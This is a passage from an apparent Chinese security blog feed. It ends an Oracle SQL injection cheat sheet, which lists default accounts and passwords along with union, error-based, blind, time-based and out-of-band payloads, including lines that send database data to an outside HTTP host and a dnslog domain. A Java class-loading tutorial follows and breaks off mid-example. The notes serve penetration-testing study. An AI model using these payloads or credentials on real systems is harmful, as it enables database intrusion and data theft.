系统里<strong>所有的表的信息</strong>，需要DBA权限才能查询</p><p><code>all_tables</code> : <strong>当前用户有权限的表的信息</strong>（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</p><p><code>user_tables</code>: <strong>当前用户名下的表的信息</strong></p><p>（关键字段：table_name）</p><p>能查询列信息的<strong>系统表</strong>：</p><p><code>dba_tab_columns</code>：对应 <strong>dba_tables表 包含的所有表的列信息</strong></p><p><code>all_tab_columns</code>：对应 <strong>all_tables表 包含的所有表的列信息</strong></p><p><code>user_tab_columns</code>：对应 <strong>user_tables表 包含的所有表的列信息</strong></p><p> （关键字段：<code>table_name,column_name,data_type,data_length</code>）</p><p><strong>内置默认账号</strong>:</p><table><thead><tr><th><strong>用户名&#x2F;密码</strong></th><th><strong>登录身份</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>sys&#x2F;change_on_install</td><td>SYSDBA 或 SYSOPER</td><td>不能以 NORMAL 登录，可作为默认的系统管理员</td></tr><tr><td>system&#x2F;manager</td><td>SYSDBA 或 NORMAL</td><td>不能以 SYSOPER 登录，可作为默认的系统管理员</td></tr><tr><td>sysman&#x2F;oem_temp</td><td>sysman</td><td>为 oms 的用户名</td></tr><tr><td>scott&#x2F;tiger</td><td>NORMAL</td><td>普通用户</td></tr><tr><td>aqadm&#x2F;aqadm</td><td>SYSDBA 或 NORMAL</td><td>高级队列管理员</td></tr><tr><td>dbsnmp&#x2F;dbsnmp</td><td>SYSDBA 或 NORMAL</td><td>复制管理员</td></tr></tbody></table><p><strong>oracle特点</strong>：</p><ul><li><p><strong>不支持堆叠查询</strong></p><p>可以尝试提交多语句支持符号 <code>;</code>，如果支持多行查询，说明是MSSQL或MySQL，不支持则是 Oracle</p></li><li><p>使用<strong>查询语句必须跟上表名</strong>，如果没有表则使用 <strong>dual 表</strong></p></li><li><p><strong>Oracle的数据类型是强匹配的</strong></p><p>在进行类似union查询数据时候必须让<strong>对应位置上的数据类型和表中的列的数据类型是一致的</strong>，也可以使用<strong>null代替某些无法快速猜测出数据类型的位置</strong>。</p></li><li><p><strong>没有limit语句</strong></p><p>一般使用 <code>where rownum=1</code> 语句代替</p></li><li><p><strong>有 user_tables 等其它类型数据库没有的表</strong></p></li><li><p><strong>当前数据库名就是当前用户名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from dual </span><br></pre></td></tr></table></figure><p>其实就是<strong>同时获取数据库名和用户名</strong></p></li><li><p><strong>可用的注释符</strong></p><p>单行注释<code>--</code> 和 多行注释<code>/**/</code>，只有MySQL才支持<code>#</code>注释符</p></li><li><p><strong>oracle没有if函数</strong></p><p>一般进行布尔盲注时一般使用<strong>decode()或者instr()函数，或者使用 case when语句</strong></p></li><li><p><strong>可通过<code>||</code>拼接字符</strong></p></li></ul><h4 id="注入姿势-2"><a href="#注入姿势-2" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h5><ul><li><p><strong>判断字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure></li><li><p><strong>对每列数据类型进行判断</strong></p><p>有用Oracle是强比较，需要数据类型一致，我们可以默认每一列均为null，然后从第一列开始依次将<strong>null改为字符串，如果报错则说明该列是数字型</strong>，否则则是字符型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br><span class="line"></span><br><span class="line">?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>信息获取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库信息</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br><span class="line">#获取当前用户</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,user from dual</span><br><span class="line">#获取当前环境</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,(select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;) from dual) from dual</span><br></pre></td></tr></table></figure><blockquote><p><code>sys.v_$version</code>：Oracle 的系统视图（System View），用于展示数据库的版本信息。</p><p><code>banner</code>：存储版本描述字符串的字段。</p></blockquote></li><li><p><strong>获取库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br><span class="line">#第二个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊字段找表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>找列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class="line">#第二列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊查询</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>找数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure></li></ul><h5 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h5><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法</p><h6 id="ctxsys-drithsx-sn"><a href="#ctxsys-drithsx-sn" class="headerlink" title="ctxsys.drithsx.sn()"></a>ctxsys.drithsx.sn()</h6><p><code>ctxsys.drithsx.sn</code> 的第二个参数<strong>预期接受特定格式的文本索引标识符</strong>（如数字或合法名称）。</p><p>而当传入<strong>非预期的字符串</strong>（例如 <code>SCOTT</code>）时，函数无法正确处理，抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure><blockquote><p>第二个参数类型不符号报错</p><p>其中<code>1=</code>让函数结果与 <code>1</code> 进行比较，从而强制执行函数并触发错误。</p></blockquote><h6 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name()"></a>utl_inaddr.get_host_name()</h6><p><code>utl_inaddr.get_host_address</code> 本意是获取<strong>ip 地址</strong>，但是如果<strong>传递参数无法得到解析</strong>就会返回一个oracle 错误并显示传递的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure><h6 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType()"></a>XMLType()</h6><p>Oracle 的 <code>XMLType()</code> 函数会尝试将一个字符串转换为 XML 数据类型，通过构造<code>&lt;:...&gt;</code>从而<strong>抛出 XML 解析错误</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure><blockquote><p><code>||</code>拼接</p><p><code>upper()</code> 是为了触发数据类型转换、强制处理</p><p><code>is not null</code> 是为了让整个表达式合法</p></blockquote><h6 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin()"></a>dbms_xdb_version.checkin()</h6><p>Oracle 的 <code>DBMS_XDB_VERSION</code> 是一个内部 PL&#x2F;SQL 包，当给<code>checkin()</code>传入<strong>错误的数据类型</strong>（比如传入了一个超长字符串或格式不合规的值），就会触发异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure><h6 id="bms-xdb-version-makeversioned"><a href="#bms-xdb-version-makeversioned" class="headerlink" title="bms_xdb_version.makeversioned()"></a>bms_xdb_version.makeversioned()</h6><p><code>bms_xdb_version.makeversioned()</code>是 Oracle XML DB 的一个过程，用于对数据库对象进行“版本控制”。当传入的不是 XMLDB 所期望的对象（如不存在的表名、格式非法），就会抛出异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><h6 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()"></a>dbms_utility.sqlid_to_sqlhash()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><h5 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h6><p>decode(字段或字段的运算，值1，值2，值3）<br>当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p><ul><li><p><strong>获取表数量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from user_tables)&gt;1--</span><br></pre></td></tr></table></figure></li><li><p><strong>获取第一个表长</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from user_tables where rownum=1)&gt;8--</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表的第一个ascii码的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from user_tables where rownum=1),0,1))&gt;82--</span><br></pre></td></tr></table></figure></li><li><p><strong>判断值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1),0) from dual) --</span><br></pre></td></tr></table></figure><blockquote><p>如果用户名第一个字符为S则返回1，否则返回默认值</p></blockquote></li></ul><h6 id="instr"><a href="#instr" class="headerlink" title="instr()"></a>instr()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instr((select user from dual),&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><p><strong>instr会返回s在用户名中的位置，未找到就返回0</strong></p><h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="dbms-pipe-receive-message"><a href="#dbms-pipe-receive-message" class="headerlink" title="dbms_pipe.receive_message()"></a>dbms_pipe.receive_message()</h6><p>DBMS_PIPE.RECEIVE_MESSAGE()是 Oracle 的一个 PL&#x2F;SQL 包函数，用于<strong>跨会话通信</strong>，让一个会话等待另一个发送消息。这里可以通过利用管道接受消息造成时间延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;pipe_name&#x27;, timeout_in_seconds);</span><br></pre></td></tr></table></figure><blockquote><p>如果<strong>没有人向这个 pipe 发消息</strong>，这个函数就会<strong>挂起当前会话，直到超时</strong>。</p></blockquote><p>检查是否存在漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure><p>配合decode实现延迟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure><h6 id="decode-耗时操作"><a href="#decode-耗时操作" class="headerlink" title="decode()+耗时操作"></a>decode()+耗时操作</h6><p>在无法使用<code>dbms_pipe.receive_message</code>可以使用<code>(select count(*) from all_objects) </code>因为该查询结果需要一定时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure><h5 id="外带注入"><a href="#外带注入" class="headerlink" title="外带注入"></a>外带注入</h5><h6 id="url-http-request"><a href="#url-http-request" class="headerlink" title="url_http.request()"></a>url_http.request()</h6><p><code>UTL_HTTP.REQUEST()</code> 是 Oracle 中一个<strong>可以发出 HTTP 请求的包</strong>，通常用于集成外部 Web 服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and utl_http.request(&#x27;http://ip:port/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class="line">#http访问时可以将||进行URL编码</span><br></pre></td></tr></table></figure><h6 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address()"></a>utl_inaddr.get_host_address()</h6><p><code>utl_inaddr.get_host_address()</code>用于域名查询，他会让Oracle 数据库服务器去查询域名的 IP，相当于做一次DNS解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure><h6 id="HTTPURITYPE"><a href="#HTTPURITYPE" class="headerlink" title="HTTPURITYPE()"></a>HTTPURITYPE()</h6><p><code>HTTPURITYPE</code> 是 Oracle 的一个类型，可以把 URL 当成对象来操作；</p><p><code>.GETCLOB()</code> 是它的方法之一，会尝试去<strong>访问该 URL</strong> 并获取其响应内容作为 CLOB 数据；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select HTTPURITYPE(&#x27;http://ip:port/&#x27;||(select user from dual)).GETCLOB() from dual)is not null --</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/carmi/p/18410869">https://www.cnblogs.com/carmi/p/18410869</a></p><p><a href="https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5">https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5</a></p><p><a href="https://www.freebuf.com/articles/web/404072.html">https://www.freebuf.com/articles/web/404072.html</a></p><p><a href="https://www.cnblogs.com/Mast1n/p/17778123.html">https://www.cnblogs.com/Mast1n/p/17778123.html</a></p><p><a href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></p><p><a href="https://cloud.tencent.com/developer/article/1631806">https://cloud.tencent.com/developer/article/1631806</a></p><p><a href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">https://www.cnblogs.com/PANDA-Mosen/p/13283204.html</a></p><p><a href="https://xz.aliyun.com/news/9823">https://xz.aliyun.com/news/9823</a></p><p><a href="https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell">https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell</a></p><p><a href="https://www.cnblogs.com/dubh3/p/15997687.html">https://www.cnblogs.com/dubh3/p/15997687.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 基础漏洞 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/archives/6d27f500/"/>
      <url>/archives/6d27f500/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>JVM把描述类文件的数据从<code>.class</code>文件加载到内存，并对数据进行校验、转换、解析和类初始化，最初形成可以被JVM使用的Java类型，这个过程被称为JVM的类加载机制。</p><p>Java类加载过程机制允许在运行时加载类，而不再局限于在编译时确定依赖。这种特性赋予了Java动态性和灵活性，使得用于可以在无需重启的情况下动态的引入新功能。</p><h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p>类的生命周期，是从加载到JVM内存开始，到卸载出JVM内存结束</p><p>整个声明周期包括：加载、验证、准备、解析、初始化、使用、卸载</p><p><img src="/archives/6d27f500/Untitled%20(1).webp"></p><p>其中从验证到解析被称为连接，从加载到初始化称为类加载。</p><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>该阶段主要作用是<strong>查找并加载类的二进制数据</strong></p><p>加载阶段：</p><ul><li><strong>通过类的全限定名（包名+类名）来获取定义此类的二进制字节流</strong></li><li><strong>将这个字节流所代表的静态存储结构转化为运行时的数据结构</strong></li><li><strong>在内存中生成一个代表这个类的<code>java.lang.Class</code>对象，作为方法区这个类的各种数据的访问入口</strong></li></ul><p><img src="/archives/6d27f500/007S8ZIlly1gi57jiyydxj30ya0icdiw.webp"></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>用于<strong>确保被加载类的正确性</strong></p><p>验证的内容：</p><ul><li><p><strong>文件格式验证</strong></p><p>验证字节流是否符合Class文件格式规范</p></li><li><p><strong>元数据验证</strong></p><p>对字节码描述的信息进行语义分析，以确保其描述的信息符合Java语言规范要求</p></li><li><p><strong>字节码验证</strong></p><p>通过数据流和控制流分析，确保程序定义是否合法、符合逻辑</p></li><li><p><strong>符号引用验证</strong></p><p>确保解析动作能正确执行</p></li></ul><p>可以考虑使用 <code>-Xverify:none</code> 参数来关闭大部分的类验证措施，以缩短JVM类加载的时间。</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p><strong>为类的静态变量分配内存，并将其初始化为默认值</strong></p><p>此阶段会在JVM内存中的<strong>方法区</strong>进行：</p><ul><li><p>内存分配仅包括<strong>类静态变量</strong>，<strong>实例变量将会在对象实例化时随着对象一起分配到Java堆中。</strong></p></li><li><p>这里所设置的初始值通常情况下是<strong>数据类型默认的零值(如<code>0</code>、<code>0L</code>、<code>null</code>、<code>false</code>等)，引用类型为null</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String s;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(i);<span class="comment">//0</span></span><br><span class="line">        System.out.println(s);<span class="comment">//null</span></span><br><span class="line">        System.out.println(b);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于同时被<strong>static和final</strong>修饰的常量，必须在<strong>声明</strong>的时候就为其<strong>显示赋值</strong>；只被<strong>final</strong>修饰的常量，在<strong>使用前</strong>必须为其<strong>显示赋值</strong>，系统不会为其赋予默认零值。否则IDEA会提示未初始化</p></li></ul><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p><strong>把类中的符号引用转换为直接引用</strong></p><ul><li><p><strong>符号引用</strong>就是<strong>一组符号来描述目标</strong>，可以是<strong>任何字面量。</strong></p><p>例如，类<code>A</code>调用类<code>B</code>的<code>method()</code>，编译后<code>.class</code>文件中会记录<code>B</code>的类名、方法名及描述符，而非实际地址。</p></li><li><p><strong>直接引用</strong>就是直接指向<strong>目标的指针</strong>、<strong>相对偏移量</strong>或一个<strong>间接定位到目标的句柄</strong>。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类A调用类B的静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        B.staticMethod(); <span class="comment">// 符号引用解析为B.staticMethod()的直接地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程，用于初始化静态变量和静态代码块</p><p>会调用<code>java.lang.ClassLoader</code>加载字节码，<code>ClassLoader</code>会调用JVM的native方法(<code>defineClass0/1/2</code>)来定义一个<code>java.lang.Class</code></p><p>其中包括：</p><ul><li><strong>执行static语句块中的语句</strong></li><li><strong>完成static属性的赋值操作</strong></li><li><strong>当类的直接父类还没有被初始化，则先初始化其父类，即父类中定义的静态语句块优先于子类的变量赋值操作</strong></li></ul><p>如果一个类中没有静态语句块，也没有对变量的赋值操作，那么编译器可以不为这个类生成<code>&lt;clinit&gt;()</code>方法。</p><h2 id="类的加载时机"><a href="#类的加载时机" class="headerlink" title="类的加载时机"></a>类的加载时机</h2><p>JVM会在程序第一次注定引用类的时候加载该类，被动引用时并不会引用类加载的操作</p><blockquote><p>被动引用可能触发类的加载，但不会触发初始化</p></blockquote><h3 id="主动引用"><a href="#主动引用" class="headerlink" title="主动引用"></a>主动引用</h3><ul><li><p>遇到<code>new</code>、<code>getstatic</code>、<code>putstatic</code>、<code>invokestatic</code>字节码指令</p><ul><li><p><code>new</code>实例化对象</p><p><code>new</code>指令需要访问类的构造函数，并分配对象内存，必须确保类已初始化</p></li><li><p><code>getstatic/putstatic</code>读取设置类的静态属性（被<code>final</code>修饰，编译期把结果放入常量池中的静态字段除外）</p></li><li><p><code>invokestatic</code>调用类的静态方法</p></li></ul></li><li><p>JVM启动，先初始化包含<code>main()</code>方法的主类</p></li><li><p>初始化一个类时，其父类还没初始化（需先初始化父类）</p></li><li><p>对类进行反射调用</p></li><li><p>JDK 1.7动态语言支持：一个<code>java.lang.invoke.MethodHandle</code>的解析结果为 <code>REF_getStatic、REF_putStatic、REF_invokeStatic</code>。</p></li></ul><h3 id="被动引用"><a href="#被动引用" class="headerlink" title="被动引用"></a>被动引用</h3><ul><li>通过子类引用父类的静态变量，不会导致子类初始化</li><li>定义类的数组类型<code>Array[] arr = new Array[10];</code>不会触发Array类初始化</li><li><code>static final VAR</code>在编译阶段会存入调用类的常量池，通过<code>ClassName.VAR</code>引用不会触发ClassName初始化</li><li>通过类名获取Class对象</li></ul><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>Java把类加载阶段中的**”通过一个类的全限名来获取描述此类的二进制字节流”这个动作放到JVM外部实现**，以便让应用程序自己决定如何去获取所需要的类，实现这个动作的代码模块称为”<strong>类加载器</strong>“。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>类加载器的分类：</p><ul><li><p><strong>启动类加载器</strong></p><p>C++语言实现，不继承<code>java.lang.ClassLoader</code>，不能被Java程序直接调用，是<strong>JVM自身的一部分</strong>。负责将<code>&lt;JAVA_HOME&gt;\lib</code>目录，或者被<code>-Xbootclasspath</code>参数所指定的路径下的类库加载到JVM内存中，<strong>用于加载Java的核心库如<code>java.lang.*</code>、<code>java.util.*</code>等。</strong></p><p>该加载器在Java中无法获取其引用（<code>ClassLoader.getParent()</code>返回<code>null</code>），是<strong>所有类加载器的祖先，没有父加载器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试获取String类的类加载器（返回null，表示由Bootstrap加载）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> String.class.getClassLoader(); <span class="comment">// null</span></span><br></pre></td></tr></table></figure></li><li><p><strong>扩展类加载器</strong></p><p>负责加载<code>&lt;JAVA_HOME&gt;\lib\ext</code>目录下的类库，或者被<code>java.ext.dirs</code>系统变量所指定的路径中的所有类库。<strong>用于加载Java扩展库</strong>，开发者可以<strong>直接使用这个类加载器(可通过ClassLoader.getSystemClassLoader().getParent()获得)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载JDK扩展库中的类（如javax包下的类）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">extLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getParent();</span><br></pre></td></tr></table></figure></li><li><p><strong>应用程序类加载器</strong></p><p>这个类加载器负责加载用户路径(CLASSPATH)下的类库，一般<strong>我们编写的Java类都是由这个类加载器加载</strong>，这个类加载器是ClassLoader中的<code>getSystemClassLoader()</code>方法的返回值，所以也称为系统类加载器。一般情况下这就是<strong>系统默认的类加载器。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取系统类加载器（默认加载用户类路径的类）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">appLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure></li><li><p><strong>自定义类加载器</strong></p><p>通过继承<code>ClassLoader</code>并重写方法，主要用于热部署、模块隔离、加密加载</p></li></ul><p><strong>类加载器的层级关系</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap 